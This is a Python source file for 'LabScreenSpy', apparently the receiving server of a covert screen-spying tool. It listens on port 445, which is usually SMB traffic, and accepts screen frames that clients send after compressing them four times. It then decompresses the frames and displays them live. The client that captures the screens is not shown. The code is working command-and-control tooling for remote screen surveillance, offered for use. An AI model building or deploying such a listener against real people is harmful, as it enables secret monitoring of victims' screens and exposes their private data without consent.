"""
LabScreenSpy - Versão 1.0.0

Autor: Ernani S. Camilo
Nickname: v0id3SC0133
"""
import socket
import cv2
from zlib import decompress
from sys import stdout

class LabScreenSpyServer:
    def __init__(self, ip='0.0.0.0', port=445, img_name='frame.jpg'):
        self.ip = ip
        self.port = port
        self.img_name = img_name

    def decompress_and_save(self, data):
        decompressed = decompress(decompress(decompress(decompress(data))))
        with open(self.img_name, 'wb') as f:
            f.write(decompressed)

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.ip, self.port))
        s.listen(5)
        print(f"[*] Servidor LabScreenSpy escutando em tcp://{self.ip}:{self.port}")

        while True:
            sock, addr = s.accept()
            print(f"[+] Conexão recebida de {addr}")

            try:
                data = sock.recv(1024).decode()
                if data.startswith("LEN:"):
                    packet_size = int(data.split(":")[1])
                    sock.send("OK".encode())

                    stdout.write(f"\rRecebendo frame de {packet_size} bytes... ")
                    stdout.flush()

                    received = b''
                    while len(received) < packet_size:
                        chunk = sock.recv(packet_size - len(received))
                        if not chunk:
                            break
                        received += chunk

                    self.decompress_and_save(received)
                    frame = cv2.imread(self.img_name, cv2.IMREAD_GRAYSCALE)
                    cv2.imshow('LabScreenSpy - Visualizador', frame)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        print("\nEncerrando servidor...")
                        break
                else:
                    sock.send("FAIL".encode())
            except Exception as e:
                print(f"Erro: {e}")
            sock.close()

        cv2.destroyAllWindows()

if __name__ == "__main__":
    server = LabScreenSpyServer()
    server.run()
